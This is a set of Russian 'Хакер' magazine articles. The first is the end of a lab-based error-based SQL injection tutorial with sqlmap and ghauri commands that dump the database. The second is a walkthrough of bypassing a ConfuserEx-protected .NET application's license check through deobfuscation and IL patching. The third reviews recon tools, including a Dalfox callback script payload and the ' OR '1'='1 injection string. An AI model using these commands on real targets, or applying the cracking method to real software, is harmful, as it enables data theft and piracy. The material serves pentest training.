 2. Выполняют запросы с подстановкой пейлоадов в точки инъекции (нап‐
   ример, в параметры URL).
 3. Сравнивают ответ с эталоном, а также анализируют ответы на возможные
   сообщения от базы данных.
 4. Когда найдена уязвимость, уточняют тип и версию системы управления
   базой данных.
 5. Получают данные: информацию о хосте, операционной системе, поль‐
   зователе и его правах. Если пользователь указал, какие данные нужно
   выкачать из базы, — пытаются выкачать эти данные.

Попробуй запустить обе утилиты и получить информацию из второй лабы:


sqlmap -u "http://localhost:8083/levels/level2_type.php?year=2025"
--technique= E --dbms=mysql --batch --dump





Параметры, которые я использовал:
 • -u  "https://.." — URL страницы с уязвимостью. Если работаешь
   с POST-запросом, удобнее сохранить запрос в файл и указать к нему путь
   через -r ;
 • --technique=E — способ атаки. Я указал E , чтобы утилита искала только
   error-based. Лаба не защищена, если не указать конкретную технику, ути‐
   лита зацепится за union или другой тип SQL injection;
 • dbms=mysql — когда точно известно, какая база данных используется,
   можно ее указать через параметр dbms . Это значительно сократит время
   поиска уязвимости, иначе sqlmap будет пробовать все известные типы
   баз, пока не наткнется на уязвимость;
 • --batch — указал sqlmap, чтобы она сама принимала решение в спорных
   моментах;
 • --dump — попросил sqlmap выкачать все данные из базы. В реальном
   пентесте желательно получить список баз данных параметром --dbs .
   После найти интересные таблицы через параметр --tables . Затем нужно
   узнать их структуру при помощи --columns . Только после этого можно
   скачивать, указав конкретную базу в -D , таблицу в -T и колонки в -C . Ина‐
   че можно попасть в ситуацию, когда скачивается десяток баз данных
   с гигабайтами информации.


        WWW

                   В документации к sqlmap есть подробная инс‐
                           трукция по использованию утилиты. «Хакер» тоже
                           неоднократно писал об SQL-инъекциях и sqlmap.


Переходим к ghauri:


ghauri -u "http://localhost:8083/levels/level2_type.php?year=2025"
--dbms mysql --technique E --batch --dump





                          Чек через ghauri

Как видишь, запуск программы почти идентичный. Утилиты очень схожи в сво‐
ей работе, но имеют разные наборы пейлоадов и способов детекта уяз‐
вимостей.
  Но не думай, что можно на 100% положиться на утилиты. Например, в лабе
«Level 3 — Слепая инъекция», обе программы не смогут найти точку инъ‐
екции. Мы с тобой убедились, что приложение уязвимо, и подобрали пейлоад
для получения данных, а обе утилиты не справляются. Добиться того, чтобы
мапа нашла точку инъекции, можно, но это потребует от тебя серьезных зна‐
ний о работе с самими утилитами.


ПРЕВРАЩЕНИЕ ДРУГИХ SQLI В ERROR-BASED

Error-based — это один из самых быстрых типов инъекций. С boolean-based
выкачивание базы происходит в разы медленнее. Time-based можно считать
черепахой среди SQL-инъекций. Но иногда есть способ превратить один тип
инъекции в другой. Чаще всего это возможно, если к инъекции присоединяет‐
ся LFI или missconfig сервера. Если ты нашел способ читать лог ошибок,
высок шанс привести медленную инъекцию к быстрому error-based.
   Открой в моей лабе «Level 5 — Ошибки в логах». Здесь есть точка инъ‐
екции в параметре ?tag= . Выполни такую команду:


sqlmap -u "http://localhost:8083/levels/level5_log.php?tag=*" --batch
--risk 3 --dbms MySQL

Мапа найдет два типа инъекции: boolean-based и time-based. На локальном
сервере выгрузка данных будет мгновенной. При работе с реальным тар‐
гетом только получение списка таблиц может занять часы.





                        Найденные мапой инъекции

Хорошая новость в том, что на сайте доступен для чтения лог: http://
localhost:8083/levels/error.log. В него падают все ошибки, связанные
с базой данных. Попробуй указать sqlmap, что ты хочешь использовать тех‐
нику E , и добавь параметр --second-url. Этот параметр рассчитан на инъ‐
екцию второго порядка, когда пейлоад отправляется на одной странице,
а результат можно увидеть совсем в другом месте. Команда запуска будет
выглядеть так:


sqlmap -u "http://localhost:8083/levels/level5_log.php?tag=*" --batch
--risk 3 --dbms MySQL --technique E --second-url http://localhost:
8083/levels/error.log





                   Результат «преобразования» типа инъекции

В результате увидишь, что мапа нашла новый тип инъекции — error-based.
Такое поведение редко встречается, но бывает даже в крупных и популярных
CMS. Например, одно время OpenCart активно эксплуатировали хакеры.


ЗАКЛЮЧЕНИЕ

В статье мы с тобой прошли от простейшего способа увидеть ошибку, отпра‐
вив '" , до сложных техник, основанных на приведении типов. В конце вышли
на уровень «мастер», превратив не лучшие типы инъекции в быстрый error-
based. Но нужно понимать, что материал не исчерпывающий. Чтобы мастер‐
ски владеть этим типом инъекции, тебе стоит больше узнать об особенностях
разных баз данных. Например, как MySQL игнорирует деление на ноль.
   Также есть смысл больше узнать про способы генерации ошибок, нап‐
ример как вместо EXTRACTVALUE использовать UPDATEXML. Но главное, что
у тебя появилась прочная база. Ты понимаешь, что такое error-based-инъ‐
екция, и знаешь, на каком этапе есть смысл генерировать ошибку, а на каком
это лишено смысла.
  Я постарался максимально понятно объяснить суть этой уязвимости.
Напиши в комментариях, насколько это у меня получилось! © X
ВЗЛОМ





В этой статье мы разберем практический
пример работы с приложением, защищен‐
ным   кастомной   версией   ConfuserEx,
которая  ломает  большинство  известных                                                                               JaboHack
деобфускаторов. Мы  выясним,  почему
автоматические  инструменты  не  справ‐
ляются,  и  посмотрим,  как  вмешаться
в работу  деобфускатора, вытащить  рас‐
шифрованный  IL-код и  подготовить  его
к дальнейшему анализу и патчу.


Тема обфускации и деобфускации программ на .NET воистину неисчерпаема:
мы с тобой уже рассмотрели множество известных и не очень обфускаторов
в статьях « Ангард! Реверсим приложение, защищенное DNGuard », « Неядер‐
ный  реактор. Взламываем  протектор .NET Reactor » и « Реверсинг  .NET.
Как  искать  JIT-компилятор  в  приложениях »,  но  вопрос  деобфускации
по‑прежнему остается открытым.
    Актуальности ему добавляет и то, что даже широко известные обфуска‐
торы постоянно совершенствуются (и, надеюсь, мои статьи разработчикам
в этом помогают). Более того, часто это происходит настолько оперативно,
что за полгода в очередную версию уже разобранного по винтикам обфуска‐
тора добавляют столько нового и интересного, что можно смело разбирать
его с самого начала. Темой сегодняшнего обсуждения я выбрал широко рас‐
пространенный проект, несправедливо обойденный вниманием в моих пре‐
дыдущих обзорах, — Confuser.
   Собственно, ранее я не касался этой темы исключительно из‑за рас‐
пространенности обфускатора: он изначально заявлен как open source, и,
хотя сайт проекта за давностью лет уже не открывается, сам обфускатор лег‐
ко гуглится. Нетрудно найти гитхабовский репозиторий Confuser (ныне, прав‐
да, тоже уже изрядно устаревший). С тех пор каждый уважающий себя .NET-
разработчик, не желающий тратить деньги на готовое сильное решение типа
DNGuard,  считает  своим  долгом  взять  свободные  исходники  Confuser
и модифицировать их под себя, чтобы проект не деобфусцировался стандар‐
тными инструментами, которых тоже написано великое множество.
  Их реально настолько много, что даже перечислять тут не буду. Деоб‐
фускаторы для Confuser вынесли в отдельный список на GitHub . Статей
по деобфускации тоже хватает, хоть и не в русскоязычном сегменте (надеюсь
слегка исправить это упущение), — приводить конкретные ссылки не стану,
нагуглишь самостоятельно. Есть и наглядные мануалы. При всей моей нелюб‐
ви к ютубовским видеообзорам лично мне понравилась видеоинструкция
по снятию ConfuserEx . В ней подробно описаны принципы обфускации
ControlFlow,   контроля   целостности,  шифрования/дешифрования  кода
и используемых ConfuserEx строк. В принципе, из этого ролика ты можешь
получить  гораздо  больше  полезной  теоретической  информации,  чем
из сегодняшней статьи. Поэтому я, как обычно, не буду дублировать теорию,
а на практическом примере разберу порядок действий для случая, когда
стандартные подходы по какой‑то причине не приносят результата.
   Итак, условие задачи: у нас есть приложение на .NET, для которого необ‐
ходимо по возможности обойти механизм лицензирования. Detect It Easy сра‐
зу предупреждает, что это будет непросто, поскольку приложение обфусци‐
ровано при помощи одной из модификаций Confuser.





Отладчик dnSpy, в котором мы открываем это приложение, сообщает нам две
новости — плохую и хорошую. Плохая новость заключается в том, что подав‐
ляющая часть наименований методов обфусцирована до нечитабельности,
а код самих методов скрыт (мы сталкивались с подобным еще в самой первой
статье про обфускацию .NET — « Реверсинг .NET. Как искать JIT-компилятор
в приложениях »).
  С другой стороны, мы уже достаточно много узнали про обфускацию .NET,
чтобы не пугаться таких сложностей. Причем в статье « Теневые вызовы. Ана‐
лизируем хитрую обфускацию в Quick License Manager » я приводил пример,
как технически реализуется подобное сокрытие кода и его динамическая заг‐
рузка. Более того, в упомянутом ролике приводятся подробности, где и как
конкретно это делает изучаемый нами Confuser.
   Хорошей новостью можно назвать то, что, внимательно полистав списки
обфусцированных классов и методов, мы с радостью обнаруживаем, что наз‐
вания интересующих нас методов проверки лицензии не обфусцированы
(похоже, потому, что эти самые методы объявлены как public для удобства
вызова).





А это означает, что с нас снимается самая неприятная часть работы по поиску
кода лицензирования в динамике. По сути, нам нужно только деобфусци‐
ровать нужный код и придумать, как побороть проверку лицензии.
   Начнем с деобфускации, благо в нашем распоряжении есть целый арсе‐
нал упомянутых выше инструментов. Конечно, видеоинструкция за год сильно
устарела, упоминаемая в нем модификация de4dot сразу рушится по исклю‐
чению и не деобфусцирует ровным счетом ничего. Но это не страшно, сущес‐
твует целый набор более современных деобфускаторов.
  К сожалению, как ты уже наверняка догадался, мы, похоже, имеем дело
с какой‑то необычной кастомной версией ConfuserEx, которая вроде как и
распознается деобфускаторами, но не деобфусцируется полностью, выкиды‐
вая какую‑нибудь ошибку. К примеру, деобфускатор ConfuserEx-Unpacker By
ElektroKill в самом конце деобфускации выдает вот такое.





Полученный в итоге модуль очень похож на настоящий, но он не работает, и,
что самое обидное, в нем напрочь отсутствует интересующий нас класс
License . Подобные неприятные сюрпризы возникают в ходе работы абсо‐
лютно любого деобфускатора из приведенного выше списка — модуль или не
деобфусцируется совсем, или деобфусцируется, но с нечитаемым кодом,
или какая‑то часть кода и вовсе выкидывается. Строки не деобфусцирует
ни один инструмент, а главное, ни один из известных деобфускаторов не соз‐
дает работоспособный код.
   Что поделать, придется брать в руки отладчик и допиливать деобфускатор
самостоятельно. Раз уж мы использовали в качестве примера ConfuserEx-
Unpacker, попробуем разобраться, почему он чудит. Тем более он подробно
логирует собственную работу в консоль и какую‑то часть кода все‑таки деоб‐
фусцирует нормально.
   Загружаем ConfuserEx-Unpacker в dnSpy и попытаемся деобфусцировать
целевой модуль. Подсказку, где именно следует искать ошибку, нам дает пре‐
дыдущий скриншот. На нем точно указан ее источник — вызов метода
AntiDebugDeobfuscator.Deobfuscate из UnpackerEngine.Run в модуле
Unpacker.Core.dll. Перейдя в него, мы обнаруживаем в этом месте сле‐
дующий цикл:


...
foreach (Deobfuscator deob in UnpackerEngine.context.Deobfuscators)
{
    try
    {
        deob.Deobfuscate(UnpackerEngine.context);
    }
    catch (Exception ex)
    {
        UnpackerEngine.context.Logger.ErrorException("Error:\n", ex);
    }
}
...

Смысл его состоит в том, что на деобфусцируемый модуль в цикле пос‐
ледовательно натравливается множество классов‑деобфускаторов из очень
длинного списка UnpackerEngine.context.Deobfuscators . Часть из них
не работает на нашей кастомной версии ConfuserEx: одни просто генерируют
ошибку (как в логе из скриншота), другие зачем‑то убирают необходимые
методы и классы. Но, по счастью, все они нам и не нужны. Чтобы вытащить
на поверхность для исследования закриптованный код всех методов, нам
достаточно    всего‑навсего    первых    двух:   AntiDecompilerRemover
и AntiTamperDeobfuscator (собственно, второй и расшифровывает спря‐
танный код).
   ConfuserEx-Unpacker не шибко богат опциями командной строки, позволя‐
ющими убрать остальные, мешающие нам деобфускаторы, оставив только
эти два, а пересобирать его из исходников у нас нет ни времени, ни желания.
Поэтому прямо в отладчике мы принудительно прекращаем этот цикл после
применения нужных деобфускаторов и сохраняем полученный модуль.
  К сожалению, многие проигнорированные нами (и, вероятно, отсутству‐
ющие) обфускаторы были необходимы для жизни модуля, поскольку деоб‐
фусцированный таким варварским методом код все‑таки неработоспособен.
Более того, в нем классы и методы по‑прежнему имеют нечитаемые имена,
control flow запутан и строки зашифрованы. Однако модуль содержит весь
нужный нам код в расшифрованном виде, пригодном для исследования.





В принципе, если поднапрячься, логику проверки лицензии можно разобрать
даже по такому коду. Если лень, то можно в UnpackerEngine открыть допол‐
нительно, например, деобфускатор ControlFlowDeobfuscator, который сделает
код более читаемым. Так что задача‑минимум вроде как выполнена, давай
теперь подумаем над более ленивым путем — патчем.
   Если бы деобфусцированный модуль был работоспособным, задача ста‐
ла бы тривиальной: достаточно поправить два байта в начале метода на 17
2A ( ldc.i4.0 ret), ну для надежности забить нулями исправленную команду.
Можно вернуться к видеоинструкции и с ее помощью победить антиотладку
и  проверку  целостности,  вернув деобфусцированному модулю работос‐
пособность, но это уже будет выходить за рамки сегодняшней статьи, пос‐
кольку такой путь сложно назвать ленивым.
   Другой путь, требующий чуть большего напряжения, я уже описывал
в статье « Неядерный реактор. Взламываем протектор .NET Reactor ». Его суть
заключается в том, что если алгоритм шифрования кода не слишком сложен
(в приведенной статье это обычный XOR по маске), то можно попробовать
внести патч прямо в шифрованный код. Посмотрим, сработает ли это в дан‐
ном случае.
  Для этого вспомним, что в ConfuserEx-Unpacker код расшифровывается
деобфускатором AntiTamperDeobfuscator. Внутри него с помощью нехитрых
действий  обнаруживаем  вызов  Deobfuscate  ->  UnAntiTamper  ->
DecryptMethods , расшифровывающий целый блок данных зашифрованного
IL-кода. Алгоритм расшифровки несложен:


while ((ulong)i < (ulong)((long)num))
{
    uint num2 = reader.ReadUInt32();
    numArray[(int)i] = (num2 ^ AntiTamperDeobfuscator.arrayKeys[(int
)((IntPtr)((long)((ulong)(i & 15u))))]);
    AntiTamperDeobfuscator.arrayKeys[(int)((IntPtr)((long)((ulong)(i
& 15u))))] = num2 + 1035675673u;
    i += 1u;
}

Фактически это тоже простой XOR кода по маске из шестнадцати 32-битных
слов, однако после каждого XOR маска заполняется новыми значениями, счи‐
танными из зашифрованного кода. То есть просто взять и поксорить несколь‐
ко байтов, как в «Реакторе», все‑таки нельзя, изменение каждого байта вле‐
чет за собой перекриптование всего следующего за ним блока. Но не беда,
мы с таким уже сталкивались: несложно написать функцию, перекриптовыва‐
ющую весь блок кода.
   Гораздо хуже, если алгоритм шифрования кода содержит компрессию (а
реализация ConfuserEx вполне на это способна). Другая проблема — допол‐
нительные  проверки  целостности, которых в ConfuserEx и так накидано
изрядно. Их поиск и исправление (а для их поиска придется еще и антиотла‐
дочные закладки патчить) может сделать решение задачи чрезвычайно тру‐
дозатратным.
   Поэтому я, как обычно, рекомендую универсальный проверенный спо‐
соб — динамический патч расшифрованного кода перед JIT-компиляцией.
Если ты забыл, напоминаю, что этот метод подразумевает изготовление
лоадера (или прокси-DLL), который патчит IL-код в момент, когда он уже рас‐
шифрован, но еще не откомпилирован в натив.
  В итоге мы снова приходим к не слишком приятной мысли: универсальных
«волшебных кнопок» против кастомных сборок Confuser не существует и вряд
ли таковая когда‑нибудь появится. Любой автоматический деобфускатор
хорош ровно до того момента, пока разработчик не поменяет в обфускаторе
пару внутренних алгоритмов. Зато у нас под рукой есть отладчик, а еще есть
понимание принципов работы обфускаторов и умение вмешиваться в про‐
цесс на нужном этапе.
   Даже если код нельзя аккуратно и полностью деобфусцировать, почти
всегда можно вытащить его в читаемом виде, проанализировать и либо про‐
патчить его на лету, либо встроить собственный код в цепочку расшифровки.
ConfuserEx в этом смысле не исключение, а, скорее, наглядный пример:
сколько бы новых слоев защиты ни добавляли поверх IL, финальной точкой
все равно остается момент перед JIT-компиляцией, где и обрываются все
красивые схемы. © X
ВЗЛОМ





Покопавшись в своем ящике инструментов,
я нашел  несколько жемчужин, которыми
решил  поделиться.  Сбор  информации
о таргете, поиск скрытых путей и секретных              ret0x2A
                                                                                            @ret0x2A
данных, сканирование XSS и альтернатива
Burp.


GOSPIDER

 • GitHub: github.com/jaeles-project/gospider

Этот многопоточный краулер может вытащить полную структуру сайта одной
командой. Анализирует sitemap.xml и robots.txt. Умеет запрашивать дан‐
ные из Wayback Machine, Common Crawl, VirusTotal и AlienVault OTX. Ищет
ссылки в JS-файлах. Вытаскивает поддомены.
  С помощью этого паука ты построишь максимально полную карту сайта,
найдешь интересные пути и продумаешь векторы атаки. Представь, какие
возможности откроются тебе, если разработчик забыл удалить ссылку на ста‐
рую уязвимую админку?
   Инструмент опенсорсный, можешь покопаться в исходниках в репози‐
тории на GitHub .
    Установка:


go install github.com/jaeles-project/gospider@latest

Пример использования:


 gospider -s https://target -d 3 -c 20 --js --subs -o output/





                        Пример вывода gospider

Параметры, которые могут пригодиться:
 • --cookie — использовать какую‑то специфичную куку;
 • --header —  указать  свой  заголовок.  Например, x-middleware-
  subrequest при краулинге сайта на Next.js с CVE-2025-29927 (под‐
   робнее о ней — в моей статье );
 • --js — искать ссылки в JS-файлах;
 • --subs — собирать поддомены;
 • -a — искать инфу на сторонних ресурсах (Archive.org, CommonCrawl.org
   и других);
 • -o — вывести в файл;
 • -p — настроить прокси. Пример: http://localhost:8080 .

Неудобно, что отсутствует возможность указать файл со списком прокси, но,
если твоя прокси с ротацией, вполне хватит для краулинга.


SECRETFINDER

 • GitHub: github.com/m4ll0k/SecretFinder

Незаменимая тулза, когда нужно быстро найти секреты. Ищет по регуляркам:
API-ключи, токены, JWT и пароли. Работает по большому набору регулярок,
но поддерживает кастомные выражения. Используй -r  <regex>,  чтобы
передать свою регулярку.
   Можешь натравить тулзу как на сайт, так и на локальные файлы. Удобно,
если выкачал копию сорцов и нужно быстро проанализировать. Поддержи‐
вает файлы, экспортированные из Burp.





                      Пример работы SecretFinder

Пример запуска с кастомной кукой, заголовком, прокси и регуляркой:


python3 SecretFinder.py -i https://example.com/ -e -o cli \
    -c 'mysessionid=111234' \
    -H 'x-header:value1\nx-header2:value2' \
    -p 127.0.0.1:8080 \
    -r 'apikey=my.api.key[a-zA-Z]+'

Устанавливается из сорцов :


git clone https://github.com/m4ll0k/SecretFinder.git secretfinder
cd secretfinder
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
# Чек установки
python SecretFinder.py -h


JSLUICE

 • Сайт: bishopfox.com/tools/jsluice
 • GitHub: github.com/BishopFox/jsluice

Мощный и точный анализатор кода на JavaScript. Вытаскивает URL, пути, сек‐
реты и интересные строки не через примитивные регулярки, а с помощью
синтаксического разбора (на базе Tree-sitter). Тулза найдет для тебя то, что
большинство других инструментов пропускают: динамически собираемые
URL (через конкатенацию строк, шаблоны, выражения), секреты с учетом их
семантики и относительные пути.
   JSluice разработан Томом Хадсоном, создателем gron, meg и  unfurl.
Это один из самых качественных и современных инструментов для JS-recon
в багбаунти и пентесте. Часто используется в связке с katana, feroxbuster,
gospider и hakrawler.





           Пример вывода JSluice с форматированием через jq

Установка:


go install github.com/BishopFox/jsluice/cmd/jsluice@latest
# Как и в случае с другими тулзами, нужно экспортировать пути в .
bashrc
echo 'export PATH="$HOME/go/bin:$PATH"' >> ~/.bashrc
# Подгрузи .bashrc
source ~/.bashrc

Использование:


jsluice <режим> [параметры] [файлы...]

Есть два режима работы для хацкера:
 • urls — извлечение URL и путей;
 • secrets — извлечение секретов и интересных строк.





                        Пример поиска секретов

Поддерживает три режима работы для статического анализа кода.
   Режим tree — вывод синтаксического дерева.





                          Вывод дерева JSluice

Режим query —  выполнение  Tree-sitter-запросов. Для работы  с этим
режимом тебе нужно познакомиться с синтаксисом запросов  Tree-sitter.
Хорошо дополняет режим tree , с помощью запросов ты быстро найдешь
нужный участок кода.
   Режим format — бьютифай для JavaScript-кода. Пример ввода:


function x(a,b){return fetch("/api/"+a,{method:"POST",body:JSON.
stringify(b)})}var c=123;

На выходе:


function x(a, b) {
    return fetch("/api/" + a, {
        method: "POST",
        body: JSON.stringify(b)
    });
}
var c = 123;


XNLINKFINDER

 • GitHub: github.com/xnl-h4ck3r/xnLinkFinder

Улучшенная и сильно расширенная эволюция классического LinkFinder. Ищет
не только ссылки в JavaScript, но и потенциальные параметры, генерирует
целевые словари под конкретный сайт, вытаскивает секреты и работает
с кучей разных источников (не только JS-файлы).
    Установка:


git clone https://github.com/xnl-h4ck3r/xnLinkFinder.git
cd xnLinkFinder
python3 -m venv .venv
source .venv/bin/activate
pip install .

Пример работы в связке с gospider :


gospider -s https://ffuf.me --js --subs -o gospider_output
--other-source

Удаляем сервисные данные gospider вроде [href] и чистим от мусорных
ссылок на картинки и подобное:


cat gospider_output.txt | \
    grep -E 'http[s]?://' | \
    sed 's/.* - //' | \
    grep -vE '\.(
jpg|jpeg|png|gif|svg|ico|css|woff|ttf|eot|mp3|mp4|webm|avi)$' | \
    sort -u > filtered_urls.txt

На выходе чистый filtered_urls.txt, который отдаем xnLinkFinder:


xnLinkFinder -i filtered_urls.txt -sf ffuf.me -sp ffuf.me -op params.
txt -owl wordlist.txt -os secrets.txt

 • Параметром -i указан путь к файлу со списком URL.
 • За фильтрацию отвечает -sf , иначе xnLinkFinder пойдет не только
   по ссылкам, указывающим на целевой домен. В отфильтрованном файле
   есть ссылки на Twitter и другие сайты, которые нам неинтересны.
 • Параметром -sp задаем xnLinkFinder , какой домен нужно добавить
   к относительным путям. Пути вида /path превратятся в ffuf.me/path .
 • Чтобы тулза сохранила найденные параметры, я добавил параметр -op
   и название файла, в который их сохранить.
 • Параметром -owl передаю путь к файлу, куда сохранить потенциальный
   словарь. Словарь позже можно использовать для майнинга параметров
   и фаззинга через ffuf или другую тулзу.
 • Параметр -os нужен на случай, если xnLinkFinder найдет в выводе
   какие‑то секретные данные. Спойлер — не в этот раз.





                           Вывод xnLinkFinder

В итоге xnLinkFinder обработал 546 ссылок, составил словарь на 31 строку,
нашел 18 параметров. На мое удивление, раздобыл 14 секретов. В этом слу‐
чае почти ничего серьезного, например:


  {
    "type": "Generic API Key",
    "value": "API_KEY":"AIzaSyBU2xE_....-I"",
    "sources": [
      "https://www.youtube.com/watch?v=iLFkxAmwXF0"
    ],
    "count": 1
  }

Как видишь, инструмент крайне полезный. Подробнее ищи инфу в репози‐
тории xnLinkFinder на GitHub.


ARJUN

 • GitHub: github.com/s0md3v/Arjun
 • Автор: Somdev Sangwan (@s0md3v)

Это многопоточный инструмент, написанный на Python и предназначенный
для поиска скрытых HTTP-параметров в веб‑приложениях и  API. С его
помощью ты  найдешь  параметры, которые не  видны  в URL,  формах
или документации, но могут обрабатываться сервером.
   Arjun использует эвристику — анализирует изменения в статус‑кодах, раз‐
мере ответа или изменения контента, чтобы отличить реальные параметры
от шума. Сканирует быстро: обычно за десять секунд с 50–60 запросами.
   Arjun поможет тебе составить полную карту API, найти недокументирован‐
ные эндпоинты и протестировать на неожиданное поведение.
   Это один из топовых инструментов для майнинга параметров. В связке
с Burp Suite, ffuf и другими тулзами Arjun превращается в грозное оружие
пентестера.
   Установить можно из репозитория:


sudo apt install arjun

Пример запуска:


arjun -u http://ffuf.me/cd/param/data -o ffuf.me.json





                                Работа Arjun

Для теста я использовал специально созданную страницу для майнинга
параметров на ffuf.me . Arjun справился с задачей и нашел скрытый параметр
debug . JSON-файл с результатом выглядит так:


{
    "http://ffuf.me/cd/param/data": {
        "headers": {
            "Accept": "text/html,application/xhtml+xml,application/
xml;q=0.9,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:83.0)
Gecko/20100101 Firefox/83.0"
        },
        "method": "GET",
        "params": [
            "debug"
        ]
    }

У тулзы есть свой стандартный словарь на 25 890 значений. Если недостаточ‐
но, укажи любой собственный словарь через -w .
  По умолчанию Arjun отправляет GET-запросы. Изменить метод можно
через -m . Иногда полезно указать свои заголовки параметром --headers
или добавить какую‑то дату к запросу через --include.
   Интересный режим --passive: в нем Arjun пытается расширить свой сло‐
варь за счет исторических данных Wayback Machine (archive.org), Common
Crawl и AlienVault OTX (Open Threat Exchange). После --passive нужно указать
домен, который Arjun будет искать в указанных сервисах. Так ты можешь найти
старые параметры, которые разработчики забыли отключить.


DALFOX

 • Сайт: dalfox.hahwul.com
 • GitHub: github.com/hahwul/dalfox

Перед нами мощный и быстрый опенсорсный сканер XSS (в первую очередь
reflected, stored и blind), написанный на Go. Основной фокус — автоматизация
поиска и верификации XSS-уязвимостей с глубоким анализом параметров.
   Тулза не просто отправляет пейлоады, а проводит серьезный анализ:
определяет, куда именно инжектится значение (HTML-контекст, атрибут, JS,
event-handler и так далее), проверяет на наличие «плохих» символов, филь‐
тров WAF, рефлексию. Умеет находить точки инъекции с помощью BAV (Basic
Another Vulnerability) и майнинга параметров.
   Установка из исходников:


go install github.com/hahwul/dalfox/v2@latest





                              Результат работы Dalfox

Пример запуска:


dalfox url "https://target.com/"




                                     Продолжение статьи →
                   ← НАЧАЛО СТАТЬИВЗЛОМ
 СЕМЬ ДРУЗЕЙ ХАКЕРА
            СОБИРАЕМ ИНСТРУМЕНТЫ
             ДЛЯ УСИЛЕНИЯ РАЗВЕДКИ




Сначала указываешь режим работы (в примере url), после параметры запус‐
ка. Dalfox умеет работать в нескольких режимах:
 • url — сканирование одной ссылки (самый частый сценарий);
 • pipe — режим пайплайна, Dalfox читает URL из пайплайна;
 • file — сканирование списка URL из файла;
 • sxss — тестирование stored XSS; если тестишь этот режим, указывай
   параметр --trigger <url> , чтобы Dalfox после отправки пейлоада
  перешел на URL и проверил, сработала ли инъекция;
 • server — запуск собственного сервера для blind XSS;
 • payload — просто генерация и тестирование пейлоадов.

Обрати внимание на параметр -b , через него ты можешь указать колбэк‑сер‐
вер. Тогда Dalfox будет пытаться подставить URL колбэка в пейлоады вроде
<script src="<callback_url>">script>" . Если пейлоад сработает, уви‐
дишь запрос. Юзай Burp Collaborator или webhook.site .





                    Запрос, перехваченный в webhook.site

Из минусов: очень плохо работает с DOM-based XSS, можно сказать никак.
Может активно жрать память при работе с большими веб‑приложениями.
Во всем остальном — классный инструмент.


CAIDO

 • Сайт: caido.io
 • GitHub: github.com/caido/caido (релизы и roadmap)
 • Документация: docs.caido.io

На  закуску оставил главного монстра. Caido — это  альтернатива Burp
в перехвате трафика и подмене запросов. Как пишут разработчики, «сделано
хакерами для хакеров». Инструмент написан на Rust, что намекает на высокую
производительность. И  правда, программа  потребляет гораздо меньше
ресурсов, чем Burp.


             INFO

                     На мой взгляд, в Burp ужасно реализована работа
                        с памятью. Если ты пробовал тестировать собс‐
                           твенное  расширение,  видел,  как при  каждом
                          релоаде   расширения   увеличивается   объем
                       пожираемой памяти.


Caido предустановлена в Kali Linux, начиная с версии 2025.3. Если у тебя
более ранняя, выполни


sudp apt update
sudo apt install caido

После установки запусти Caido командой caido . Программа предложит выб‐
рать  инстанс.  Создай новый или  запусти  существующий,  настроенный
на проксирование 127.0.0.1:8080 . У меня система забита всяким хламом,
поэтому я добавил инстанс на порт 8083 , им и буду пользоваться. При добав‐
лении не забудь открыть Advanced и убедись, что стоит галочка на Allow
guests.





                                Инстансы Caido

Caido предложит авторизоваться либо работать как guest . Подробно о раз‐
нице между режимами читай в документации . Коротко: проекты не сохраня‐
ются, любой желающий из твоей сети может подключиться к экземпляру,
и есть ограничение на количество плагинов — гость может установить только
один плагин.
   Возможности бесплатного зарегистрированного аккаунта перечислены
в тарифной сетке Caido. Вот основные плюсы: сохранение двух проектов,
поддержка семи воркфлоу (не путать с workspaces), возможность установки
до трех плагинов, более широкий инструментарий для работы с HTTP и филь‐
трации трафика.
  Для теста будет достаточно работы под guest .





                             Авторизация в Caido

Мы будем проксировать трафик из браузера, значит, тебе нужно установить
в браузер сертификат Caido. Ты найдешь его в профиле пользователя (даже
guest). Кликни на аватарку, в выпадающем меню найди CA Certificate. Жми
Download CA Certificate. Инструкции по установке в разные браузеры находят‐
ся под кнопкой скачивания сертификата.





                          Установка сертификата Caido

Как и в Burp, в Caido работа ведется на основе проектов. На Workspace жми
кнопку Create a project. Укажи любое имя. Как guest можно создавать только
временные (temporary) проекты.





                           Создание проекта

Для теста я использую лабу PortSwigger SQL injection vulnerability in WHERE
clause allowing retrieval of hidden data . Запусти лабу. В браузере настрой прок‐
сирование через Caido. Я добавил в FoxyProxy свой 127.0.0.1:8083 .
   Найди в меню слева пункт Intercept и кнопкой Forward запусти перехват
запросов. Перехват во всех программах работает и выглядит плюс‑минус
одинаково. В Caido нет ничего лишнего, только сам запрос.





                        Запрос, перехваченный Caido

Поставь галочку Responses, если хочешь видеть ответы сервера. Для работы
с Websocket есть своя галочка. История запросов HTTP и Websocket хранится
отдельно. Для перехода в историю ищи соответствующие пункты в меню сле‐
ва.
   Чтобы выполнить тестовую лабу с SQL-инъекцией, нужно отправить в зап‐
росе строку ' OR '1'='1. В чистом виде она не пройдет, нужно URL-кодиро‐
вание. Вбей инъекцию в перехваченный запрос, выдели строку и нажми пра‐
вую кнопку мыши. В появившемся меню найди Convert (Replace), в подменю
ищи URL Encode. На выходе увидишь готовую для инъекции строку.
  По умолчанию в Caido нет сканеров наподобие активного и пассивного
сканирования в Burp. Сканеры тебе нужно установить отдельно, в виде пла‐
гинов. Перейди в меню Plugins. На вкладке Official найди плагин Scanner. Пла‐
гин реализует функцию активного и пассивного сканирования. Пассивное
сканирование работает само по себе. Чтобы запустить активный сканер,
перейди в историю запросов или перехвати новый запрос. Жми правую кноп‐
ку мыши и найди Plugins → Scanner → Run Active Scanner.





Сконфигурируй сканирование и запускай. Результаты увидишь на дашборде
плагина. Чтобы его найти, слева разверни группу меню Plugins и кликни
по Scanner. Найденные проблемы, что пассивного сканера, что активного,
упадут в папку Findings и отобразятся на дашборде.





                          Дашборд плагина

Ты можешь писать собственные плагины на TypeScript/JavaScript. Но помни
про ограничения тарифов. Гостю доступен только один плагин, зарегистри‐
рованному пользователю — три. И только если заплатишь 200 долларов
в год, сможешь установить неограниченное число плагинов.
   Отдельного  внимания  стоит  визуальный  конструктор  автоматизаций
Workflows. С помощью конструктора ты можешь создать поток, который будет
обрабатывать запросы. В Caido по умолчанию добавлены несколько при‐
меров потоков. Например, Color Top-level Navigations. Этот воркфлоу помеча‐
ет запрос цветовой меткой в HTTP History, в зависимости от условий. Перей‐
ди в редактирование этого потока, чтобы лучше понять смысл.





                   Воркфлоу Color Top-level Navigations

